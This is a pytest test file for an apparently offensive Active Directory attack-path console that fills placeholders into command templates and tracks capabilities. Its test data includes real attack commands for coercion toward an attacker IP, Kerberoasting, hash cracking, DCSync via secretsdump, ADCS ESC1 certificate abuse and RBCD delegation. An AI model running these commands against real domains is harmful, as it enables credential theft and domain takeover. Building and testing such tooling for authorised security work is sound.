"""Tests for the interactive console: variable substitution, outcome
detection, and session-level capability updates."""

from __future__ import annotations

from domainerator.console import outcomes
from domainerator.console.session import Session
from domainerator.console.variables import Variables
from domainerator.paths import Capability, Noise, PathStep, Reliability
from domainerator.runner import CheckResult, Target, ToolRunner

# --- variable substitution -------------------------------------------------

def test_substitute_fills_known_placeholders():
    v = Variables()
    v.set("LHOST", "10.0.0.5")
    v.set("DC_IP", "10.0.0.10")
    cmd = "coercer coerce -t DC-IP -l ATTACKER-IP"
    assert v.substitute(cmd) == "coercer coerce -t 10.0.0.10 -l 10.0.0.5"
    assert v.missing_placeholders(cmd) == []


def test_substitute_leaves_unset_tokens_and_reports_missing():
    v = Variables()
    cmd = "coercer coerce -t DC-IP -l ATTACKER-IP"
    # Nothing set: both placeholders remain, both reported missing.
    assert "DC-IP" in v.substitute(cmd)
    assert "ATTACKER-IP" in v.substitute(cmd)
    missing = v.missing_placeholders(cmd)
    assert "DC_IP" in missing
    assert "LHOST" in missing


def test_short_token_not_matched_inside_larger_word():
    v = Variables()
    v.set("DC", "dc01")
    v.set("DOMAIN", "corp.local")
    v.set("USER", "alice")
    # "-just-dc" must survive; trailing "@DC" is replaced.
    cmd = "secretsdump.py -just-dc DOMAIN/USER@DC"
    out = v.substitute(cmd)
    assert "-just-dc" in out
    assert out.endswith("@dc01")
    assert "corp.local/alice@dc01" in out


def test_seed_from_target_does_not_override_explicit_set():
    v = Variables()
    v.set("DC", "manual-dc")
    target = Target(host="10.0.0.10", domain="corp.local", dc_ip="10.0.0.10")
    v.seed_from_target(target)
    # Explicit set wins; unset ones get filled.
    assert v.get("DC") == "manual-dc"
    assert v.get("DOMAIN") == "corp.local"


# --- outcome detection -----------------------------------------------------

def test_interpret_kerberoast_success_grants_capability():
    output = "SVC$  $krb5tgs$23$*svc*...hash..."
    outcome = outcomes.interpret("Kerberoast", Capability.SPN_TGS, output)
    assert outcome.success
    assert outcome.capability == Capability.SPN_TGS
    assert any("krb5tgs" in item for item in outcome.loot)


def test_interpret_failure_signal_is_not_success():
    output = "[-] STATUS_LOGON_FAILURE"
    outcome = outcomes.interpret("Kerberoast", Capability.SPN_TGS, output)
    assert not outcome.success
    assert outcome.capability is None


def test_interpret_unrecognized_output_is_unconfirmed():
    outcome = outcomes.interpret("Kerberoast", Capability.SPN_TGS, "some unrelated text")
    assert not outcome.success
    assert "unconfirmed" in outcome.detail.lower()


def test_interpret_asrep_extracts_loot():
    output = "user  $krb5asrep$23$user@CORP:abcdef..."
    outcome = outcomes.interpret("AS-REP-roast", Capability.ASREP_HASH, output)
    assert outcome.success
    assert any("krb5asrep" in item for item in outcome.loot)


# --- session integration ---------------------------------------------------

def _session() -> Session:
    runner = ToolRunner(dry_run=True)
    target = Target(host="10.0.0.10", domain="corp.local")
    return Session(runner=runner, target=target)


def test_session_auto_seeds_variables_from_target():
    s = _session()
    assert s.variables.get("DC") == "10.0.0.10"
    assert s.variables.get("DOMAIN") == "corp.local"


def test_session_grant_capability_recompute_reflects_new_paths():
    s = _session()
    # Add a step that turns SPN_TGS into valid credentials so a DA path can
    # only exist once we hold the prerequisite capability.
    result = CheckResult(name="kerb", category="authenticated")
    result.add_step(
        PathStep(
            name="crack tgs",
            technique="Hash-crack",
            requires=frozenset({Capability.SPN_TGS}),
            grants=Capability.VALID_CREDENTIALS,
            command="hashcat ...",
            description="crack",
            reliability=Reliability.SPECULATIVE,
            noise=Noise.QUIET,
        )
    )
    s.add_result(result)

    s.capabilities = {Capability.UNAUTHENTICATED}
    s.recompute_paths()
    before = len(s.attack_paths)

    # Granting SPN_TGS should let the crack step fire on recompute.
    s.grant_capability(Capability.SPN_TGS)
    s.recompute_paths()
    assert Capability.SPN_TGS in s.capabilities
    # Paths should not decrease after gaining a capability.
    assert len(s.attack_paths) >= before


def test_session_add_loot_dedupes():
    s = _session()
    s.add_loot(["hashA", "hashB"])
    s.add_loot(["hashA", "hashC"])
    assert s.loot == ["hashA", "hashB", "hashC"]


# --- multi-target / sessions ----------------------------------------------

def _multi_session() -> Session:
    runner = ToolRunner(dry_run=True)
    t1 = Target(host="10.0.0.10", domain="corp.local",
                username="alice", password="pw", dc_ip="10.0.0.10")
    t2 = Target(host="10.0.0.20", domain="other.local")
    t3 = Target(host="10.0.0.30", domain="corp.local")
    return Session(runner=runner, target=t1, targets=[t1, t2, t3])


def test_active_target_included_when_targets_omitted():
    s = _session()
    # A lone target becomes the sole entry in the targets list.
    assert s.target_hosts() == ["10.0.0.10"]
    assert s.target is s.targets[0]


def test_active_target_prepended_if_missing_from_list():
    runner = ToolRunner(dry_run=True)
    active = Target(host="10.0.0.99", domain="corp.local")
    other = Target(host="10.0.0.20", domain="corp.local")
    s = Session(runner=runner, target=active, targets=[other])
    # Active target must be represented; it is inserted at the front.
    assert s.target_hosts()[0] == "10.0.0.99"
    assert "10.0.0.20" in s.target_hosts()


def test_target_hosts_lists_all_scanned():
    s = _multi_session()
    assert s.target_hosts() == ["10.0.0.10", "10.0.0.20", "10.0.0.30"]


def test_switch_target_changes_active_and_reseeds_auto_vars():
    s = _multi_session()
    assert s.target.host == "10.0.0.10"
    assert s.variables.get("DOMAIN") == "corp.local"

    assert s.switch_target(1) is True
    assert s.target.host == "10.0.0.20"
    # DC follows the new active host (auto-seeded).
    assert s.variables.get("DC") == "10.0.0.20"
    # DOMAIN follows too (was auto-seeded, target 2 has other.local).
    assert s.variables.get("DOMAIN") == "other.local"


def test_switch_target_preserves_operator_set_vars():
    s = _multi_session()
    s.variables.set("DOMAIN", "pinned.local")  # operator override
    assert s.switch_target(1) is True
    # Operator-set DOMAIN must survive a target switch.
    assert s.variables.get("DOMAIN") == "pinned.local"
    # DC (still auto) follows the switch.
    assert s.variables.get("DC") == "10.0.0.20"


def test_switch_target_out_of_range_returns_false():
    s = _multi_session()
    assert s.switch_target(99) is False
    assert s.switch_target(-1) is False
    # Active target unchanged.
    assert s.target.host == "10.0.0.10"


def test_set_then_switch_keeps_value_but_auto_var_updates():
    s = _multi_session()
    # Auto USER carried from t1.
    assert s.variables.get("USER") == "alice"
    # Operator pins USER.
    s.variables.set("USER", "svc_account")
    s.switch_target(2)  # t3 has no username
    # Pinned USER preserved; DC updated to t3.
    assert s.variables.get("USER") == "svc_account"
    assert s.variables.get("DC") == "10.0.0.30"


# --- console scan / rescan (regression: these were no-op stubs) ------------

from domainerator.console.console import Console  # noqa: E402
from domainerator.runner import CommandOutput  # noqa: E402


class _ScanFakeRunner:
    """A ToolRunner stand-in that returns canned output per command so the real
    check parsers produce findings and path steps."""

    def __init__(self, responder):
        self.timeout = 300
        self.dry_run = False
        self.scope = None
        self._responder = responder

    def is_available(self, name):
        return True

    def find_tool(self, name):
        return "/usr/bin/" + name

    def run(self, argv, timeout=None):
        cmd = " ".join(argv)
        return CommandOutput(
            command=cmd, return_code=0,
            stdout=self._responder(argv, cmd), stderr="", duration_seconds=0.1,
        )


def test_scan_command_runs_checks_and_recomputes(monkeypatch):
    # SMB-signing-disabled output -> a relay_target capability + a path step.
    def responder(argv, cmd):
        if argv[:2] == ["nxc", "smb"] and "-M" not in cmd and "--shares" not in cmd \
                and "--rid-brute" not in cmd:
            return "SMB 10.0.0.10 445 DC01 (signing:False) (SMBv1:False)"
        return ""

    runner = _ScanFakeRunner(responder)
    target = Target(host="10.0.0.10", domain="corp.local")  # unauthenticated
    session = Session(runner=runner, target=target, targets=[target])
    session.capabilities = {Capability.UNAUTHENTICATED}
    console = Console(session)

    assert session.check_results == []
    console.cmd_scan(["unauthenticated"])

    # The stub did nothing before; now it must actually run checks and update
    # the session capabilities from the discovered path steps.
    assert session.check_results, "scan must populate check results"
    assert Capability.RELAY_TARGET in session.capabilities


def test_rescan_does_not_duplicate_results(monkeypatch):
    runner = _ScanFakeRunner(lambda argv, cmd: "")
    target = Target(host="10.0.0.10", domain="corp.local")
    session = Session(runner=runner, target=target, targets=[target])
    console = Console(session)

    console.cmd_rescan([])
    first = len(session.check_results)
    assert first > 0
    console.cmd_rescan([])
    # Re-running replaces prior same-named results rather than appending.
    assert len(session.check_results) == first


def test_scan_rejects_unknown_category(capsys):
    runner = _ScanFakeRunner(lambda argv, cmd: "")
    target = Target(host="10.0.0.10", domain="corp.local")
    session = Session(runner=runner, target=target, targets=[target])
    console = Console(session)
    console.cmd_scan(["bogus"])
    out = capsys.readouterr().out
    assert "Unknown category" in out
    assert session.check_results == []


# --- path selection numbering (regression: show paths vs use were off-by-one)

def _session_with_paths():
    runner = ToolRunner(dry_run=True)
    target = Target(host="10.0.0.10", domain="corp.local",
                    username="alice", password="pw", dc_ip="10.0.0.10")
    session = Session(runner=runner, target=target, targets=[target])
    r = CheckResult(name="kerb", category="authenticated")
    r.add_step(PathStep(
        name="Kerberoast", technique="Kerberoast",
        requires=frozenset({Capability.VALID_CREDENTIALS}),
        grants=Capability.SPN_TGS, command="nxc ldap DC --kerberoasting",
        description="d", reliability=Reliability.HIGH, noise=Noise.QUIET,
    ))
    session.add_results([r])
    session.capabilities = {
        Capability.UNAUTHENTICATED, Capability.VALID_CREDENTIALS,
        Capability.LOW_PRIV_USER, Capability.DCSYNC,
    }
    session.recompute_paths()
    return session


def test_select_path_is_one_based():
    s = _session_with_paths()
    assert s.attack_paths, "fixture must produce at least one path"
    # id 1 selects the first path; id 0 is now invalid.
    assert s.select_path(1) is True
    assert s.selected_path is s.attack_paths[0]
    assert s.select_path(0) is False


def test_select_path_last_id_valid_and_overflow_rejected():
    s = _session_with_paths()
    n = len(s.attack_paths)
    assert s.select_path(n) is True
    assert s.selected_path is s.attack_paths[n - 1]
    # One past the end must not select (this was the off-by-one error).
    assert s.select_path(n + 1) is False


def test_cmd_use_rejects_out_of_range_without_crashing(capsys):
    s = _session_with_paths()
    console = Console(s)
    n = len(s.attack_paths)
    console.cmd_use([str(n + 1)])
    out = capsys.readouterr().out
    assert "Invalid path id" in out
    assert s.selected_path is None


def test_cmd_use_non_numeric_is_handled(capsys):
    s = _session_with_paths()
    console = Console(s)
    console.cmd_use(["abc"])
    assert "Invalid path id" in capsys.readouterr().out


def test_cmd_use_reports_reachability(capsys):
    s = _session_with_paths()
    console = Console(s)
    console.cmd_use(["1"])
    out = capsys.readouterr().out
    assert "Reachability:" in out


# --- full placeholder resolution + unresolved-token guard ------------------

def _creds_vars():
    """Variables seeded from a provided-cred Target (as the console does)."""
    v = Variables()
    t = Target(host="dc01.corp.local", domain="corp.local",
               username="alice", password="P@ss", dc_ip="10.0.0.10")
    v.seed_from_target(t)
    return v


def test_cred_chain_steps_fully_resolve():
    v = _creds_vars()
    # These are the real path-step command templates; from provided creds +
    # defaults they must resolve with nothing left unresolved.
    for cmd in [
        "nxc ldap DC -u USER -p PASS --kerberoasting out.tgs",
        "hashcat -m 13100 out.tgs wordlist.txt",
        "hashcat -m 18200 asrep.hash wordlist.txt",
        "hashcat -m 31300 timeroast.hash wordlist.txt",
        "certipy auth -pfx administrator.pfx -dc-ip DC-IP",
        "secretsdump.py -just-dc DOMAIN/USER@DC",
    ]:
        assert v.unresolved_placeholders(cmd) == [], f"should resolve: {cmd}"


def test_wordlist_resolves_to_default_path_not_token():
    v = _creds_vars()
    out = v.substitute("hashcat -m 13100 out.tgs wordlist.txt")
    assert "wordlist.txt" not in out
    assert out.endswith("rockyou.txt")


def test_pwn_account_not_doubled():
    v = _creds_vars()
    out = v.substitute("rbcd.py -delegate-from 'PWN$' -action write DOMAIN/USER:PASS")
    assert "PWN$$" not in out
    assert "PWN$" in out


def test_adcs_req_blocked_until_ca_and_template_set():
    v = _creds_vars()
    cmd = ("certipy req -u USER@DOMAIN -p PASS -ca CA-NAME -template VULN-TEMPLATE "
           "-upn administrator@DOMAIN -dc-ip DC-IP")
    unresolved = v.unresolved_placeholders(cmd)
    assert "CA-NAME" in unresolved
    assert "VULN-TEMPLATE" in unresolved
    # After setting the environment-specific values, it resolves.
    v.set("CA", "corp-CA")
    v.set("TEMPLATE", "VulnTemplate")
    assert v.unresolved_placeholders(cmd) == []


def test_rbcd_blocked_until_target_set():
    v = _creds_vars()
    cmd = "rbcd.py -delegate-to 'TARGET$' -delegate-from 'PWN$' -action write DOMAIN/USER:PASS"
    assert v.unresolved_placeholders(cmd), "TARGET must be required before running"
    v.set("TARGET", "DC01$")
    assert v.unresolved_placeholders(cmd) == []


def test_owner_maps_token_to_variable():
    v = Variables()
    assert v.owner("VULN-TEMPLATE") == "TEMPLATE"
    assert v.owner("TARGET$") == "TARGET"
    assert v.owner("totally-unknown") == "totally-unknown"


def test_execute_step_refuses_unresolved_command(monkeypatch, capsys):
    # A selected ADCS step with CA/TEMPLATE unset must be refused by run, not
    # executed with broken literals.
    runner = ToolRunner(dry_run=True)
    target = Target(host="dc01.corp.local", domain="corp.local",
                    username="alice", password="P@ss", dc_ip="10.0.0.10")
    session = Session(runner=runner, target=target, targets=[target])
    step = PathStep(
        name="ESC1: request privileged certificate", technique="ESC1",
        requires=frozenset({Capability.LOW_PRIV_USER}),
        grants=Capability.CERT_AS_DA,
        command=("certipy req -u USER@DOMAIN -p PASS -ca CA-NAME "
                 "-template VULN-TEMPLATE -upn administrator@DOMAIN -dc-ip DC-IP"),
        description="d", reliability=Reliability.HIGH, noise=Noise.MODERATE,
    )
    console = Console(session)
    cmd = session.variables.substitute(step.command)
    console._execute_step(step, cmd, [])
    out = capsys.readouterr().out
    assert "Refusing to run" in out
    assert "VULN-TEMPLATE" in out or "CA-NAME" in out
